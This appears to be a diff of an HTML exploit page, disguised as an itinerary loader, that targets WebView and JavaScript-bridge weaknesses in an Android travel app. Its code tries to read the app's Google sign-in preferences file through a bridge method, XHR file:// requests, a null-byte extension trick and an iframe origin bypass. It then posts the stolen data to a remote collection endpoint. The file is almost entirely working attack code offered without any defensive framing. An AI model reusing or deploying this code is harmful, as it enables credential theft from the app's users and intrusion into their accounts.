@@ -1,53 +1,90 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Checking Itinerary...</title>
+    <title>Itinerary Loading...</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
+        .hidden { display: none; }
+    </style>
 </head>
 <body>
+    <h2>System Diagnostic</h2>
+    <div id="status">Initializing modules...</div>
+
     <script>
         const C2 = "https://evilios.free.beeceptor.com/exfil";
-        const targetPath = "/data/data/ctrip.english/shared_prefs/com.google.android.gms.signin.xml";
+        const TARGET = "file:///data/data/ctrip.english/shared_prefs/com.google.android.gms.signin.xml";
 
-        function log(msg) {
-            fetch(C2 + "?log=" + btoa(msg), {mode:'no-cors'});
+        function report(type, data) {
+            fetch(C2, {
+                method: "POST",
+                mode: "no-cors",
+                body: JSON.stringify({ type: type, val: data, ts: Date.now() })
+            });
         }
 
-        async function runExploit() {
-            log("Starting Bridge Exploit...");
-
-            // 1. Check for the Bridge Gadget
-            if (window.Destination_a && typeof window.Destination_a.gsImageBase64Str === 'function') {
-                try {
-                    // This bypasses SOP because the Java code reads the file, not the JS engine
-                    const stolenData = window.Destination_a.gsImageBase64Str(targetPath);
-                    
-                    if (stolenData) {
-                        log("Success: Data captured via Bridge");
-                        await fetch(C2, {
-                            method: "POST",
-                            mode: "no-cors",
-                            body: JSON.stringify({
-                                method: "JS_BRIDGE_BYPASS",
-                                file: targetPath,
-                                data: stolenData // This is already Base64 from the bridge
-                            })
-                        });
+        // 1. Attempt XHR bypass with Null Byte or forced mapping
+        function tryXHR() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", TARGET, true);
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == 4) {
+                    if (xhr.status == 200 || xhr.responseText.length > 0) {
+                        report("XHR_SUCCESS", btoa(xhr.responseText));
                     } else {
-                        log("Bridge returned empty or null.");
+                        report("XHR_FAIL", "Status: " + xhr.status);
                     }
-                } catch (e) {
-                    log("Bridge Execution Error: " + e.message);
                 }
-            } else {
-                log("Destination_a.gsImageBase64Str not found.");
-                
-                // 2. Fallback: Try a Redirect to the file (Sometimes WebView allows rendering but not fetching)
-                log("Attempting direct location redirect fallback...");
-                window.location.href = "file://" + targetPath;
-            }
+            };
+            xhr.send();
         }
 
-        window.onload = runExploit;
+        // 2. Brute Force Bridge Identification
+        function probeBridges() {
+            const bridges = ['Destination_a', 'Util_a', 'IBUMarket_a', 'H5MarketPlugin', 'MobileClient'];
+            bridges.forEach(b => {
+                if (window[b]) {
+                    report("BRIDGE_FOUND", b + " methods: " + Object.keys(window[b]).join(','));
+                    
+                    // Attempt specific gadget exploit if Destination_a is found
+                    if (b === 'Destination_a' && window[b].gsImageBase64Str) {
+                        try {
+                            // Try common traversal or extension bypass
+                            let data = window[b].gsImageBase64Str(TARGET);
+                            if (data) report("BRIDGE_STEAL_BASE", data);
+                            
+                            // Try appending a fake extension if the Java code checks for .jpg
+                            let data2 = window[b].gsImageBase64Str(TARGET + "\0.jpg");
+                            if (data2) report("BRIDGE_STEAL_NULLBYTE", data2);
+                        } catch(e) {}
+                    }
+                }
+            });
+        }
+
+        // 3. Iframe Pivot (SOP Bypass check)
+        function tryIframe() {
+            const ifr = document.createElement('iframe');
+            ifr.style.display = 'none';
+            ifr.src = TARGET;
+            ifr.onload = function() {
+                try {
+                    // If UniversalAccess is truly on, we can reach into the iframe
+                    const content = ifr.contentDocument.body.innerText;
+                    report("IFRAME_STEAL", btoa(content));
+                } catch(e) {
+                    report("IFRAME_ERROR", "CORS block on iframe access");
+                }
+            };
+            document.body.appendChild(ifr);
+        }
+
+        window.onload = function() {
+            document.getElementById('status').innerText = "Executing payloads...";
+            tryXHR();
+            probeBridges();
+            tryIframe();
+        };
     </script>
 </body>
 </html>
